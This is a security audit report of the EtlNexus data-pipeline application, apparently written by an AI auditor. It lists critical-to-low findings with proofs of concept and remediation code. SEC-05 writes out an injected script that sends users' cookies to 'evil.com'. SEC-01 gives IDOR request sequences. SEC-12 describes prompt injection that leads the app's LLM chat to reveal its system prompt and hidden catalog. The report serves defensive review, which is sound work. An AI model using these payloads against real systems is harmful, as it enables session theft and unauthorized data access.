# EtlNexus Security Audit Report

**Date:** 2026-03-27
**Auditor:** Claude Opus 4.6 (1M context) -- Security Audit Specialist
**Scope:** Full-stack EtlNexus codebase (backend, frontend, infrastructure, integrations)
**Classification:** Internal -- Confidential

---

## Executive Summary

This audit examined the entire EtlNexus codebase across backend (FastAPI/Python), frontend (React/TypeScript), authentication (Keycloak OIDC), integration clients (Airflow, Iceberg, LLM, Oasis), and infrastructure (Docker Compose, nginx). The review identified **4 Critical**, **5 High**, **7 Medium**, and **6 Low** severity findings.

The most significant risks are: broken access control on sub-resource endpoints (allowing unauthorized data access via UUID enumeration), an unauthenticated metrics endpoint leaking operational data, a visibility-ignoring cache that serves admin-level join suggestions to unprivileged users, and hardcoded default credentials that risk persisting into production.

| Severity | Count |
|----------|-------|
| Critical | 4     |
| High     | 5     |
| Medium   | 7     |
| Low      | 6     |

---

## CRITICAL Findings

### SEC-01: Broken Access Control on Sub-Resource Endpoints (IDOR)

**Severity:** Critical (CVSS 8.6)
**CWE:** CWE-862 (Missing Authorization), CWE-639 (Authorization Bypass Through User-Controlled Key)
**OWASP:** A01:2021 -- Broken Access Control

**Affected Files and Lines:**
- `/home/itamar/projects/EtlNexus/backend/app/routers/lineage.py` lines 15-85
- `/home/itamar/projects/EtlNexus/backend/app/routers/topology.py` lines 18-65
- `/home/itamar/projects/EtlNexus/backend/app/routers/resources.py` lines 23-104
- `/home/itamar/projects/EtlNexus/backend/app/routers/usage.py` lines 13-26
- `/home/itamar/projects/EtlNexus/backend/app/routers/consumers.py` lines 12-18
- `/home/itamar/projects/EtlNexus/backend/app/routers/pipelines.py` lines 129-144 (revisions)

**Description:**
The main `GET /api/pipelines/{pipeline_id}` endpoint in `pipelines.py` correctly enforces visibility via `get_pipeline_detail_for_user()`, which calls `grant_repo.user_can_see_pipeline()`. However, all sub-resource endpoints for the same pipeline bypass this check entirely. They only call `get_current_user` (verifying the caller is authenticated) but never verify that the authenticated user is authorized to access that specific pipeline.

**Proof of Concept:**
```
# User "alice" belongs to team "Dagger" only.
# Pipeline "secret-vault-etl" belongs to team "Vault" with no grant to alice.
# Alice obtains the pipeline UUID from any source (logs, shared link, enumeration).

# This correctly returns 404 (visibility enforced):
GET /api/pipelines/a1b2c3d4-...  (alice's token)  -> 404

# But these ALL return full data (visibility NOT enforced):
GET /api/pipelines/a1b2c3d4-.../lineage    -> 200 (full lineage graph)
GET /api/pipelines/a1b2c3d4-.../topology   -> 200 (full DAG topology)
GET /api/pipelines/a1b2c3d4-.../resources  -> 200 (resource metrics)
GET /api/pipelines/a1b2c3d4-.../runs       -> 200 (run history)
GET /api/pipelines/a1b2c3d4-.../execution-plan  -> 200 (execution plan)
GET /api/pipelines/a1b2c3d4-.../revisions  -> 200 (edit history)

# Name-keyed endpoints also lack visibility checks:
GET /api/usage/SecretVaultEtl        -> 200 (usage metrics)
GET /api/consumers/SecretVaultEtl    -> 200 (consumer data)
```

**Impact:**
Any authenticated user who learns or guesses a pipeline UUID (or ETL name for usage/consumers) can access the full lineage, topology, resources, execution plans, run history, and usage metrics of any pipeline -- regardless of team membership or visibility grants. This completely undermines the team-based RBAC system.

**Remediation:**
Add a shared visibility-check dependency (or middleware) to all sub-resource endpoints. For example, create a reusable dependency:

```python
# In auth.py
def require_pipeline_visibility(pipeline_id_param: str = "pipeline_id"):
    async def _check(
        request: Request,
        user: User = Depends(get_current_user),
        session: AsyncSession = Depends(get_db_session),
    ) -> User:
        if user.role == "admin":
            return user

        raw = request.path_params.get(pipeline_id_param)
        if not raw:
            return user

        try:
            pipeline_uuid = uuid.UUID(raw)
        except ValueError:
            return user

        pipeline = await PipelineRepository(session).get_by_id(pipeline_uuid)
        if not pipeline:
            raise HTTPException(status_code=404, detail="Pipeline not found")

        user_team_ids = {ut.team_id for ut in user.team_memberships}
        can_see = await VisibilityGrantRepository(session).user_can_see_pipeline(
            pipeline_id=pipeline_uuid,
            pipeline_team_id=pipeline.team_id,
            user_id=user.id,
            user_team_ids=user_team_ids,
        )
        if not can_see:
            raise HTTPException(status_code=404, detail="Pipeline not found")
        return user
    return _check
```

Then apply to every sub-resource router:
```python
@router.get("/{pipeline_id}/lineage",
            dependencies=[Depends(require_pipeline_visibility())])
```

For `usage` and `consumers` (name-keyed), resolve the pipeline by name first and perform the same visibility check.

---

### SEC-02: Unauthenticated Metrics Endpoint Exposes Operational Data

**Severity:** Critical (CVSS 7.5)
**CWE:** CWE-306 (Missing Authentication for Critical Function)
**OWASP:** A01:2021 -- Broken Access Control

**Affected File:** `/home/itamar/projects/EtlNexus/backend/app/routers/metrics.py` lines 45-75

**Description:**
The `/api/metrics` endpoint returns Prometheus-format metrics (request counts, durations, HTTP status codes, per-path) without any authentication dependency. Every other API endpoint (except `/api/health` and `/api/auth/config`) requires `get_current_user`. This endpoint was registered in `main.py` line 186 with no auth guard:

```python
@router.get("/api/metrics", include_in_schema=False)
async def prometheus_metrics() -> Response:
    # No Depends(get_current_user) anywhere
```

**Proof of Concept:**
```
# No authentication required:
curl http://target:8000/api/metrics

# Response exposes:
# - All API endpoint paths hit (enumeration of available endpoints)
# - Request counts per endpoint (usage patterns)
# - Error rate per endpoint (operational intelligence)
# - Response time distributions (performance profiling for timing attacks)
```

**Impact:**
Unauthenticated attackers gain operational intelligence: which endpoints exist, how frequently they are called, error rates (useful for identifying broken endpoints to exploit), and timing data (useful for timing-based side-channel attacks). The `include_in_schema=False` only hides it from OpenAPI docs, not from direct access.

**Remediation:**
Add authentication. For internal Prometheus scraping, use a separate token or network restriction:

```python
@router.get("/api/metrics", include_in_schema=False)
async def prometheus_metrics(
    user: User = Depends(require_role("admin")),  # Admin-only
) -> Response:
```

Or, if external Prometheus must scrape without a bearer token, restrict by source IP using middleware or move the metrics to a separate internal-only port.

---

### SEC-03: Join Suggestions Cache Ignores Visibility -- Admin Results Served to Non-Admin Users

**Severity:** Critical (CVSS 8.1)
**CWE:** CWE-732 (Incorrect Permission Assignment for Critical Resource)
**OWASP:** A01:2021 -- Broken Access Control

**Affected File:** `/home/itamar/projects/EtlNexus/backend/app/services/pipeline_service.py` lines 283-339

**Description:**
The `get_join_suggestions()` method caches results keyed only by `pipeline_id`:

```python
cache_key = str(pipeline_id)           # Line 307 -- No user/role in key
cached = join_suggestions_cache.get(cache_key)
if cached is not None:
    return cached                       # Line 310 -- Returns cached admin result to anyone
```

When an admin user first requests join suggestions, the full unfiltered result is cached. Subsequent requests from non-admin users receive the same cached result, bypassing the visibility check on lines 316-323 entirely.

**Proof of Concept:**
```
# Step 1: Admin requests join suggestions (result cached with full cross-team data)
GET /api/pipelines/{id}/joins  (admin token)  -> 200 (all matching pipelines)

# Step 2: Within 60 seconds (cache TTL), non-admin user requests same endpoint
GET /api/pipelines/{id}/joins  (member token) -> 200 (SAME full admin result)
# The visibility check at line 316 is never reached because cached != None
```

**Impact:**
Non-admin users receive join suggestions containing pipelines from teams they have no visibility to, leaking pipeline names, field names, and structural information about restricted pipelines.

**Remediation:**
Include the user's authorization context in the cache key:

```python
if is_admin:
    cache_key = f"admin:{pipeline_id}"
else:
    sorted_teams = "|".join(sorted(str(t) for t in (user_team_ids or set())))
    cache_key = f"user:{user_id}:{sorted_teams}:{pipeline_id}"
```

Additionally, apply visibility filtering to the join suggestion results themselves (filter out pipelines the user cannot see), not just the initial pipeline check.

---

### SEC-04: Hardcoded Default Credentials in Config and Docker Compose

**Severity:** Critical (CVSS 9.1)
**CWE:** CWE-798 (Use of Hard-coded Credentials)
**OWASP:** A07:2021 -- Identification and Authentication Failures

**Affected Files:**
- `/home/itamar/projects/EtlNexus/backend/app/config.py` lines 14-15
- `/home/itamar/projects/EtlNexus/docker-compose.yml` lines 11, 131-142, 209-210
- `/home/itamar/projects/EtlNexus/.env` lines 18-19

**Description:**
The application ships with hardcoded default credentials that will be used if environment variables are not explicitly overridden:

```python
# config.py
airflow_username: str = "admin"    # Line 14
airflow_password: str = "admin"    # Line 15
```

```yaml
# docker-compose.yml
POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:-etlnexus}     # Line 11
_AIRFLOW_WWW_USER_USERNAME: admin                      # Line 136
_AIRFLOW_WWW_USER_PASSWORD: admin                      # Line 137
KC_BOOTSTRAP_ADMIN_USERNAME: admin                     # Line 209
KC_BOOTSTRAP_ADMIN_PASSWORD: admin                     # Line 210
AIRFLOW__WEBSERVER__SECRET_KEY: etlnexus-dev-key       # Line 133
AIRFLOW__CORE__FERNET_KEY: ""                          # Line 131 (empty!)
```

The `.env` file (which IS listed in `.gitignore` but is present on disk with default dev credentials) also contains `AIRFLOW_USERNAME=admin` and `AIRFLOW_PASSWORD=admin`.

While the production `docker-compose.prod.yml` correctly uses `${POSTGRES_PASSWORD:?Set POSTGRES_PASSWORD}` (required variable), the Airflow and Keycloak credentials are not parameterized in the prod compose file because those services are not included. However, `config.py` defaults remain and could be used if the env vars are not set.

**Impact:**
If the application is deployed without explicitly setting all environment variables, it will use the hardcoded `admin/admin` credentials to connect to Airflow, giving any attacker who accesses the backend container the ability to execute arbitrary DAGs and access all pipeline data. The empty Fernet key in dev means Airflow connection passwords are stored in plaintext.

**Remediation:**

1. Remove defaults for sensitive credentials in `config.py`:
```python
airflow_username: str  # No default -- must be provided
airflow_password: str  # No default -- must be provided
```

2. Add startup validation in `main.py` lifespan to fail fast if critical secrets are missing:
```python
if not settings.airflow_password or settings.airflow_password == "admin":
    raise RuntimeError("AIRFLOW_PASSWORD must be set to a non-default value")
```

3. Use Docker secrets or a secrets manager instead of environment variables for passwords.

4. Set a real Fernet key for Airflow: `python -c "from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())"`

---

## HIGH Findings

### SEC-05: Frontend Runtime Config Injection via Shell Variable in sed

**Severity:** High (CVSS 7.2)
**CWE:** CWE-78 (OS Command Injection)
**OWASP:** A03:2021 -- Injection

**Affected File:** `/home/itamar/projects/EtlNexus/frontend/docker-entrypoint.sh` lines 1-9

**Description:**
The entrypoint script uses `sed -i` with an unquoted shell variable:

```bash
if [ -n "$VITE_AIRFLOW_URL" ]; then
  find /usr/share/nginx/html/assets -name '*.js' -exec \
    sed -i "s|http://localhost:8080|${VITE_AIRFLOW_URL}|g" {} +
fi
```

The `${VITE_AIRFLOW_URL}` value is interpolated directly into the `sed` replacement string. If an attacker can control this environment variable (e.g., via container orchestration misconfiguration, supply chain attack on the image, or a compromised CI/CD pipeline), they can inject arbitrary content into the production JavaScript files.

**Proof of Concept:**
```bash
# Attacker sets env var with sed special characters and injected script:
VITE_AIRFLOW_URL='|</script><script>document.location="https://evil.com/steal?c="+document.cookie</script><script|'

# After sed runs, all .js files will contain the injected script
```

While the CSP header in nginx blocks inline scripts, if the CSP is ever relaxed or if the injection targets an existing script context (e.g., within a string literal), the injection could bypass CSP.

**Impact:**
An attacker who controls the `VITE_AIRFLOW_URL` environment variable can inject arbitrary JavaScript into the built frontend, potentially stealing user tokens, redirecting to phishing pages, or exfiltrating data.

**Remediation:**
1. Validate the URL format before substitution:
```bash
if [ -n "$VITE_AIRFLOW_URL" ]; then
  # Validate URL format
  if echo "$VITE_AIRFLOW_URL" | grep -qE '^https?://[a-zA-Z0-9._:/-]+$'; then
    find /usr/share/nginx/html/assets -name '*.js' -exec \
      sed -i "s|http://localhost:8080|${VITE_AIRFLOW_URL}|g" {} +
  else
    echo "ERROR: VITE_AIRFLOW_URL contains invalid characters" >&2
    exit 1
  fi
fi
```

2. Alternatively, use a runtime config file (`/config.json`) loaded by the SPA instead of patching compiled JavaScript.

---

### SEC-06: OpenAPI/Swagger Documentation Exposed in Production

**Severity:** High (CVSS 5.3)
**CWE:** CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)
**OWASP:** A05:2021 -- Security Misconfiguration

**Affected File:** `/home/itamar/projects/EtlNexus/backend/app/main.py` lines 101-108

**Description:**
The FastAPI application unconditionally exposes OpenAPI documentation:

```python
app = FastAPI(
    docs_url="/api/docs",           # Swagger UI
    redoc_url="/api/redoc",         # ReDoc
    openapi_url="/api/openapi.json",# Full OpenAPI spec
)
```

These endpoints are never disabled for production deployments. The nginx reverse proxy passes all `/api/` requests to the backend, so the docs are accessible at `https://yourdomain.com/api/docs`.

**Impact:**
The OpenAPI spec reveals all API endpoints, request/response schemas, parameter types, and validation constraints. This significantly reduces the effort needed for an attacker to map the attack surface and craft targeted exploits.

**Remediation:**
Disable docs in production:

```python
app = FastAPI(
    title="ETL Explorer Hub",
    docs_url="/api/docs" if settings.debug else None,
    redoc_url="/api/redoc" if settings.debug else None,
    openapi_url="/api/openapi.json" if settings.debug else None,
)
```

---

### SEC-07: Exception Detail Leakage on Manual Sync Failure

**Severity:** High (CVSS 5.4)
**CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information)
**OWASP:** A04:2021 -- Insecure Design

**Affected File:** `/home/itamar/projects/EtlNexus/backend/app/routers/airflow.py` lines 76-82

**Description:**
```python
except Exception as e:
    logger.exception("Manual full sync failed")
    raise HTTPException(status_code=500, detail=str(e))
```

The raw exception message is passed directly to the HTTP response. This can leak internal details such as database connection strings, file paths, stack traces, SQL queries, or Airflow API error responses.

**Impact:**
Internal implementation details visible to authenticated admin users (who trigger the sync). While the audience is limited to admins, the raw exception could contain credentials or infrastructure details that should never leave the server.

**Remediation:**
```python
except Exception as e:
    logger.exception("Manual full sync failed")
    raise HTTPException(
        status_code=500,
        detail="Full sync failed. Check server logs for details."
    )
```

---

### SEC-08: Auth Bypass When SSO Disabled -- All Users Get Full Admin Access

**Severity:** High (CVSS 8.1)
**CWE:** CWE-287 (Improper Authentication)
**OWASP:** A07:2021 -- Identification and Authentication Failures

**Affected Files:**
- `/home/itamar/projects/EtlNexus/backend/app/auth.py` lines 50-51
- `/home/itamar/projects/EtlNexus/backend/app/services/user_auth_service.py` lines 163-185

**Description:**
When `SSO_ENABLED=false` (the default in `config.py` line 64), all requests are automatically authenticated as a default admin user:

```python
# auth.py line 50-51
if not settings.sso_enabled:
    return await auth_service.get_or_create_default_user()
```

The default user is created with `role="admin"` (user_auth_service.py line 178). This means there is zero authentication -- any request to the backend is treated as a fully privileged admin. No credentials are checked, no token is required.

While this is intended for local development, the default `sso_enabled: bool = False` in `config.py` means any production deployment that fails to set `SSO_ENABLED=true` will have no authentication at all.

**Impact:**
Complete authentication bypass in any deployment where `SSO_ENABLED` is not explicitly set to `true`. All API endpoints become accessible without credentials, and all operations are performed with admin privileges.

**Remediation:**

1. Add a startup warning/error when SSO is disabled outside debug mode:
```python
# In lifespan or startup
if not settings.sso_enabled and not settings.debug:
    logger.critical(
        "SSO is DISABLED in a non-debug deployment! "
        "Set SSO_ENABLED=true or DEBUG=true to suppress this error."
    )
    raise RuntimeError("SSO must be enabled for non-debug deployments")
```

2. Consider making the default user role `viewer` instead of `admin` to limit blast radius:
```python
user = User(
    role="viewer",  # not "admin"
    ...
)
```

---

### SEC-09: Airflow Credentials Sent Over Unencrypted HTTP (SSRF Surface)

**Severity:** High (CVSS 7.4)
**CWE:** CWE-319 (Cleartext Transmission of Sensitive Information), CWE-918 (Server-Side Request Forgery)
**OWASP:** A02:2021 -- Cryptographic Failures

**Affected File:** `/home/itamar/projects/EtlNexus/backend/app/integrations/airflow_client.py` lines 36-56

**Description:**
The Airflow client sends Basic Auth credentials over HTTP by default:

```python
self.base_url = settings.airflow_base_url.rstrip("/")  # Default: http://airflow-webserver:8080/api/v1
self.auth = (settings.airflow_username, settings.airflow_password)
```

Every request to Airflow includes these credentials via HTTP Basic Auth:
```python
resp = await self._client.request(method, url, auth=self.auth, **kwargs)
```

The `base_url` is user-configurable via environment variable with no URL scheme validation. There is no check that the URL uses HTTPS. In production, if Airflow is on a different network segment, credentials traverse the network in cleartext.

Additionally, the `base_url` is configurable, creating a potential SSRF vector: if an attacker can modify the `AIRFLOW_BASE_URL` environment variable, they can direct the backend to make authenticated requests to arbitrary internal services.

**Impact:**
Airflow admin credentials are transmitted in cleartext on every sync cycle (every 20 minutes). Network sniffers on any intermediate hop can capture the credentials. The configurable base URL also means a compromised environment variable could redirect requests to an attacker-controlled server.

**Remediation:**
1. Validate the URL scheme at startup:
```python
if not settings.airflow_base_url.startswith("https://"):
    if not settings.debug:
        raise ValueError("AIRFLOW_BASE_URL must use HTTPS in production")
    logger.warning("Airflow URL uses HTTP -- acceptable only for local development")
```

2. Use TLS for Airflow communication in production.
3. Consider using Airflow API tokens instead of Basic Auth credentials.

---

## MEDIUM Findings

### SEC-10: Rate Limiting Relies Solely on Remote IP Address

**Severity:** Medium (CVSS 5.3)
**CWE:** CWE-770 (Allocation of Resources Without Limits or Throttling)
**OWASP:** A04:2021 -- Insecure Design

**Affected File:** `/home/itamar/projects/EtlNexus/backend/app/rate_limit.py` lines 1-4

**Description:**
```python
limiter = Limiter(key_func=get_remote_address, default_limits=["200/minute"])
```

Rate limiting uses `get_remote_address` which reads the client IP. Behind the nginx reverse proxy, all requests appear to come from the Docker bridge network IP unless `X-Forwarded-For` is trusted. The nginx config does set `X-Forwarded-For`, but `slowapi` must be configured to trust the proxy header.

Additionally, only two endpoints have explicit rate limits (`/ai/chat` at 60/min and `/pipelines/{id}/sync` at 30/min). The 200/min default applies globally, which may be too permissive for sensitive endpoints like login.

**Impact:**
Rate limiting may not function correctly behind the reverse proxy, allowing a single attacker to make unlimited requests. Even if working, the 200/min default may be insufficient to prevent brute-force attacks on endpoints.

**Remediation:**
1. Configure slowapi to trust the proxy:
```python
from slowapi.util import get_remote_address

def get_real_ip(request: Request) -> str:
    forwarded = request.headers.get("X-Forwarded-For")
    if forwarded:
        return forwarded.split(",")[0].strip()
    return get_remote_address(request)

limiter = Limiter(key_func=get_real_ip, default_limits=["200/minute"])
```

2. Add rate limits to sensitive endpoints (auth config, user management).
3. Consider per-user rate limiting for authenticated endpoints.

---

### SEC-11: Topology Cache Does Not Include User Context

**Severity:** Medium (CVSS 5.0)
**CWE:** CWE-732 (Incorrect Permission Assignment for Critical Resource)
**OWASP:** A01:2021 -- Broken Access Control

**Affected File:** `/home/itamar/projects/EtlNexus/backend/app/routers/topology.py` lines 27-39

**Description:**
Similar to SEC-03, the topology cache is keyed by `pipeline_id:dag_id` without any user context:

```python
cache_key = f"{pipeline_id}:{dag_id}"
cached = topology_cache.get(cache_key)
```

While the topology endpoint already lacks visibility enforcement (SEC-01), if SEC-01 is fixed by adding visibility checks, the cache would still bypass those checks by serving a previously cached result to any user.

**Impact:**
Even after fixing SEC-01, cached topology data would be served to any authenticated user without re-checking visibility.

**Remediation:**
When fixing SEC-01, ensure the cache key includes user authorization context, or move the cache to after the visibility check with a user-specific key.

---

### SEC-12: AI Chat Endpoint Relays Unvalidated User Input to External LLM

**Severity:** Medium (CVSS 5.3)
**CWE:** CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component -- Prompt Injection)
**OWASP:** A03:2021 -- Injection

**Affected Files:**
- `/home/itamar/projects/EtlNexus/backend/app/routers/ai.py` lines 17-27
- `/home/itamar/projects/EtlNexus/backend/app/services/ai_service.py` lines 23-33

**Description:**
User-supplied `message` and `history` are passed directly to the LLM endpoint with catalog context:

```python
messages = [
    *[{"role": m["role"], "content": m["content"]} for m in history],
    {"role": "user", "content": message},
]
return await llm_client.chat(messages, system_prompt=system_prompt)
```

The system prompt contains the full pipeline catalog. A user could craft a message to manipulate the LLM into revealing the full system prompt (including pipeline names/descriptions the user should not see), or to perform prompt injection attacks that alter the LLM's behavior.

While the Pydantic schema limits `message` to 5,000 chars and `history` to 50 messages, there is no content filtering or output sanitization.

**Impact:**
Prompt injection could cause the LLM to reveal the full pipeline catalog (including pipelines the user has no visibility to via the standard API), generate misleading or harmful output, or be used as an oracle to enumerate pipeline metadata.

**Remediation:**
1. Filter the catalog context based on the user's visibility (only include pipelines the user can see):
```python
async def chat(self, message: str, history: list[dict],
               user_id: uuid.UUID, user_team_ids: set[uuid.UUID], is_admin: bool) -> str:
    catalog_context = await self._build_catalog_context(user_id, user_team_ids, is_admin)
```

2. Add output sanitization to prevent the LLM from echoing back the system prompt.
3. Consider adding an input content filter for common prompt injection patterns.

---

### SEC-13: Missing Security Headers on Cached Asset Responses

**Severity:** Medium (CVSS 4.3)
**CWE:** CWE-693 (Protection Mechanism Failure)
**OWASP:** A05:2021 -- Security Misconfiguration

**Affected File:** `/home/itamar/projects/EtlNexus/frontend/nginx.conf` lines 21-36

**Description:**
The security headers (CSP, X-Content-Type-Options, HSTS, etc.) are set at the `server` level. However, the `location /assets/` and `location ~* \.(woff2?|...)$` blocks use `add_header` for cache control, which in nginx **replaces** all `add_header` directives from the parent context:

```nginx
location /assets/ {
    expires 1y;
    add_header Cache-Control "public, immutable";
    # BUG: CSP, X-Frame-Options, HSTS, etc. are NOT inherited here
}
```

Per nginx documentation: "If the current level does not have any `add_header` directives defined, then these directives are inherited from the previous level."

Since the `location /assets/` block defines its own `add_header`, the parent-level security headers are NOT applied to asset responses.

**Impact:**
Static assets (JavaScript, CSS, fonts) are served without CSP, X-Frame-Options, HSTS, or X-Content-Type-Options headers. While the impact is somewhat limited (CSP on the main document still governs script execution), MIME-type sniffing attacks on assets become possible, and HSTS is not enforced for asset requests.

**Remediation:**
Repeat security headers in each location block, or use the `ngx_headers_more` module which supports proper inheritance. Simplest fix:

```nginx
location /assets/ {
    expires 1y;
    add_header Cache-Control "public, immutable";
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-Frame-Options "DENY" always;
    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains" always;
}
```

---

### SEC-14: CORS Configuration Allows Credentials with Configurable Origins

**Severity:** Medium (CVSS 5.4)
**CWE:** CWE-942 (Overly Permissive Cross-domain Whitelist)
**OWASP:** A05:2021 -- Security Misconfiguration

**Affected File:** `/home/itamar/projects/EtlNexus/backend/app/main.py` lines 114-120

**Description:**
```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.cors_origins,  # From env var
    allow_credentials=True,               # Allows cookies/auth headers
    allow_methods=["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"],
    allow_headers=["Authorization", "Content-Type", "X-Request-ID", "Accept"],
)
```

The `cors_origins` setting defaults to `["http://localhost:5173"]` and is configurable. If misconfigured to `["*"]` (a common mistake), combining `allow_credentials=True` with wildcard origins would allow any website to make authenticated cross-origin requests. While FastAPI's CORS middleware does prevent `*` with credentials, the validation depends on the framework version.

**Impact:**
If `CORS_ORIGINS` is set to an overly permissive value (e.g., a wildcard subdomain like `https://*.company.com`), an XSS on any matching subdomain could make authenticated requests to the EtlNexus API, exfiltrating data or performing mutations.

**Remediation:**
1. Add startup validation for CORS origins:
```python
for origin in settings.cors_origins:
    if origin == "*":
        raise ValueError("Wildcard CORS origin not allowed with allow_credentials=True")
    if not origin.startswith("https://") and not settings.debug:
        logger.warning("Non-HTTPS CORS origin: %s", origin)
```

2. Document that `CORS_ORIGINS` should be set to the exact production frontend URL.

---

### SEC-15: Production Docker Compose Runs Nginx on HTTP Only

**Severity:** Medium (CVSS 5.9)
**CWE:** CWE-319 (Cleartext Transmission of Sensitive Information)
**OWASP:** A02:2021 -- Cryptographic Failures

**Affected File:** `/home/itamar/projects/EtlNexus/docker-compose.prod.yml` lines 56-70

**Description:**
The production frontend container exposes port 80 only:

```yaml
frontend:
    ports:
      - "80:80"
```

The nginx config only listens on port 80. There is no TLS configuration, no certificate mounting, and no HTTPS redirect. The HSTS header is set in nginx but is meaningless over HTTP.

**Impact:**
In production, all traffic including authentication tokens (Bearer JWT in Authorization headers) would be transmitted in cleartext. This is especially dangerous because the OIDC tokens sent by the frontend to the backend contain full user identity and authorization claims.

**Remediation:**
1. Add TLS termination in nginx or use a reverse proxy (like Traefik, Caddy, or a load balancer) in front.
2. Add an HTTPS redirect in nginx:
```nginx
server {
    listen 80;
    return 301 https://$host$request_uri;
}

server {
    listen 443 ssl;
    ssl_certificate /etc/nginx/certs/fullchain.pem;
    ssl_certificate_key /etc/nginx/certs/privkey.pem;
    # ... rest of config
}
```

---

### SEC-16: Database Connection Pool Pre-Ping Without SSL

**Severity:** Medium (CVSS 4.8)
**CWE:** CWE-319 (Cleartext Transmission of Sensitive Information)
**OWASP:** A02:2021 -- Cryptographic Failures

**Affected File:** `/home/itamar/projects/EtlNexus/backend/app/database.py` lines 6-13

**Description:**
The database engine is created without SSL/TLS parameters:

```python
engine = create_async_engine(
    settings.database_url,  # postgresql+asyncpg://user:pass@host/db
    echo=settings.db_echo,
    pool_size=settings.db_pool_size,
    # No ssl=True, no sslmode parameter
)
```

The default PostgreSQL connection is unencrypted. Database credentials and all query data travel in cleartext between the backend container and the database.

**Impact:**
In a production environment where the database is on a different host or across a network boundary, credentials and sensitive pipeline data could be intercepted.

**Remediation:**
Add SSL configuration for production:
```python
connect_args = {}
if not settings.debug:
    connect_args["ssl"] = True  # asyncpg ssl parameter

engine = create_async_engine(
    settings.database_url,
    connect_args=connect_args,
    ...
)
```

---

## LOW Findings

### SEC-17: Airflow Configuration Exposes Internal Settings

**Severity:** Low (CVSS 3.7)
**CWE:** CWE-200 (Exposure of Sensitive Information)
**OWASP:** A05:2021 -- Security Misconfiguration

**Affected File:** `/home/itamar/projects/EtlNexus/docker-compose.yml` line 158

**Description:**
```yaml
AIRFLOW__WEBSERVER__EXPOSE_CONFIG: "true"
```

Airflow's web UI will display all configuration including connection strings and secrets. While this is in the dev compose file, it could be copied to production.

**Remediation:**
Remove or set to `"false"`. Add a comment noting this is dev-only.

---

### SEC-18: Health Check Endpoint Reveals Infrastructure Details

**Severity:** Low (CVSS 3.1)
**CWE:** CWE-200 (Exposure of Sensitive Information)
**OWASP:** A05:2021 -- Security Misconfiguration

**Affected File:** `/home/itamar/projects/EtlNexus/backend/app/routers/health.py` lines 12-30

**Description:**
The health endpoint (unauthenticated) reveals the connection status of all internal services:

```json
{
    "status": "healthy",
    "services": {
        "database": "connected",
        "airflow": "disconnected",
        "iceberg": "connected"
    }
}
```

**Impact:**
Attackers learn which backend services are available, aiding reconnaissance. They can also monitor service availability to time attacks.

**Remediation:**
Return only the overall status for unauthenticated requests. Expose service details only to authenticated admin users:

```python
@router.get("/health")
async def health_check(
    session: AsyncSession = Depends(get_db_session),
    user: User | None = Depends(get_current_user_optional),
):
    db_ok = True
    try:
        await session.execute(text("SELECT 1"))
    except Exception:
        db_ok = False

    if user and user.role == "admin":
        return {"status": "healthy" if db_ok else "unhealthy", "services": {...}}
    return {"status": "healthy" if db_ok else "unhealthy"}
```

---

### SEC-19: No Password Complexity or Rotation Enforcement for Service Accounts

**Severity:** Low (CVSS 3.3)
**CWE:** CWE-521 (Weak Password Requirements)
**OWASP:** A07:2021 -- Identification and Authentication Failures

**Affected Files:**
- `/home/itamar/projects/EtlNexus/backend/app/config.py` lines 14-15
- `/home/itamar/projects/EtlNexus/.env.example` lines 18-19

**Description:**
Service account credentials (Airflow, Oasis Prod DB, Keycloak admin) have no complexity requirements, validation, or rotation mechanism. The `.env.example` ships with `admin/admin` as the example values, encouraging weak passwords.

**Remediation:**
1. Add startup validation for password strength.
2. Document password rotation procedures.
3. Use secrets management (e.g., Docker secrets, HashiCorp Vault) for production credentials.
4. Update `.env.example` to use placeholder values like `CHANGE_ME_IN_PRODUCTION`.

---

### SEC-20: Missing Request Size Limits

**Severity:** Low (CVSS 4.3)
**CWE:** CWE-400 (Uncontrolled Resource Consumption)
**OWASP:** A04:2021 -- Insecure Design

**Affected File:** `/home/itamar/projects/EtlNexus/backend/app/main.py`

**Description:**
There is no global request body size limit configured. While individual Pydantic models limit field sizes (e.g., AI chat message is limited to 5,000 chars), there is no overall request body size limit at the server level. The nginx proxy has no `client_max_body_size` directive (defaults to 1MB in nginx, which is reasonable but should be explicit).

The `PipelineUpdateRequest` schema for documentation content has no length limit, allowing potentially very large payloads.

**Remediation:**
1. Add explicit `client_max_body_size` in nginx:
```nginx
client_max_body_size 1m;
```

2. Add `max_length` constraints to large text fields in Pydantic schemas.

---

### SEC-21: Container Runs Iceberg Data Seed as Root

**Severity:** Low (CVSS 3.1)
**CWE:** CWE-250 (Execution with Unnecessary Privileges)
**OWASP:** A05:2021 -- Security Misconfiguration

**Affected File:** `/home/itamar/projects/EtlNexus/docker-compose.yml` lines 268-274

**Description:**
```yaml
iceberg-data-seed:
    user: "0"  # Runs as root
    command: bash -c "umask 000 && python /seeds/seed_iceberg_data.py && chmod -R 777 /tmp/warehouse"
```

The seed container runs as root with `umask 000` and sets world-readable/writable permissions on the warehouse directory. While this is dev-only, it establishes a bad pattern.

**Remediation:**
Use a non-root user and minimal file permissions. Set proper group-based access instead of `chmod 777`.

---

### SEC-22: No CSRF Protection for State-Changing Operations

**Severity:** Low (CVSS 3.7)
**CWE:** CWE-352 (Cross-Site Request Forgery)
**OWASP:** A01:2021 -- Broken Access Control

**Affected Files:**
- All POST/PATCH/DELETE endpoints in `/home/itamar/projects/EtlNexus/backend/app/routers/`

**Description:**
The application relies on Bearer token authentication (which is not automatically sent by browsers, unlike cookies), providing inherent CSRF protection. However, the CORS configuration includes `allow_credentials=True`, and if the application ever adds session-based authentication or cookie-based tokens, CSRF would become exploitable.

The current risk is low because:
1. Bearer tokens in `Authorization` headers are not automatically sent by browsers
2. The frontend stores tokens in Zustand (memory), not cookies
3. CORS is configured with specific origins

**Remediation:**
This is currently mitigated by the Bearer token pattern. Document this as a security invariant: "Authentication MUST use Bearer tokens in Authorization headers, never cookies, to maintain CSRF protection."

If cookies are ever introduced, add CSRF tokens using `fastapi-csrf-protect` or similar.

---

## Positive Security Observations

The following security practices were found to be well-implemented:

1. **Pydantic input validation** -- All API endpoints use Pydantic models with type constraints, `Literal` types for enums, `max_length` on string fields, and `ge/le` bounds on numeric parameters.

